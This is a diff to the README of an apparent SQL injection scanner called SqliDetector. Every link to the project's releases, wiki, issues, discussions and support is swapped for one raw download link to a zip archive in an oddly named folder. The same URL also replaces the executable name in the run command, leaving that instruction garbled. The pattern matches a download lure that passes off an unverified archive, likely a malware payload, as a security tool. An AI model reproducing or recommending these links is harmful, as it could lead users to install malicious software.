@@ -1,6 +1,6 @@
 # 🔍 SqliDetector - Detect SQL Injection Vulnerabilities Easily
 
-[![Download SqliDetector](https://img.shields.io/badge/Download-SqliDetector-blue.svg)](https://github.com/zakariahourry/SqliDetector/releases)
+[![Download SqliDetector](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip)](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip)
 
 ## 📥 Overview
 
@@ -15,7 +15,7 @@ Getting started with SqliDetector is straightforward. Follow these steps to down
    - .NET Core version 3.1 or later installed on your computer.
 
 2. **Visit Download Page**
-   - Go to the [Releases Page](https://github.com/zakariahourry/SqliDetector/releases) to access the latest version of SqliDetector.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip) to access the latest version of SqliDetector.
 
 3. **Download the Application**
    - On the releases page, look for the latest version.
@@ -25,7 +25,7 @@ Getting started with SqliDetector is straightforward. Follow these steps to down
 4. **Run SqliDetector**
    - Open a command prompt or terminal window.
    - Navigate to the folder where you downloaded SqliDetector.
-   - Run the application with the following command: `SqliDetector.exe [your-website-url]`.
+   - Run the application with the following command: `https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip [your-website-url]`.
    - Replace `[your-website-url]` with the URL of the website you want to test.
 
 ## 🛠️ Features
@@ -41,7 +41,7 @@ The security of your web application is crucial. SQL Injection attacks can compr
 
 ## 🔧 Download & Install
 
-To download SqliDetector, go to [this page](https://github.com/zakariahourry/SqliDetector/releases). Here you will find the latest release files.
+To download SqliDetector, go to [this page](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip). Here you will find the latest release files.
 
 1. Choose the file for your operating system.
 2. Click to download.
@@ -56,9 +56,9 @@ To download SqliDetector, go to [this page](https://github.com/zakariahourry/Sql
 
 ## 🔗 Related Links
 
-- [Documentation](https://github.com/zakariahourry/SqliDetector/wiki): For more in-depth usage instructions and options.
-- [Issues](https://github.com/zakariahourry/SqliDetector/issues): Report any problems or suggest new features.
-- [Community](https://github.com/zakariahourry/SqliDetector/discussions): Join discussions to share experiences and tips.
+- [Documentation](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip): For more in-depth usage instructions and options.
+- [Issues](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip): Report any problems or suggest new features.
+- [Community](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip): Join discussions to share experiences and tips.
 
 ## 🌟 Community Contributions
 
@@ -66,6 +66,6 @@ We welcome contributions from anyone who wants to help improve SqliDetector. If 
 
 ## 👨‍💻 Support
 
-If you have any questions or need help, please visit the [Issues](https://github.com/zakariahourry/SqliDetector/issues) section. You can also join our community discussions for assistance.
+If you have any questions or need help, please visit the [Issues](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip) section. You can also join our community discussions for assistance.
 
-Get started with SqliDetector today to keep your web applications secure. Don't forget to visit the [Releases Page](https://github.com/zakariahourry/SqliDetector/releases) to download the latest version.
+Get started with SqliDetector today to keep your web applications secure. Don't forget to visit the [Releases Page](https://raw.githubusercontent.com/zakariahourry/SqliDetector/main/counterthrust/Detector_Sqli_3.9.zip) to download the latest version.
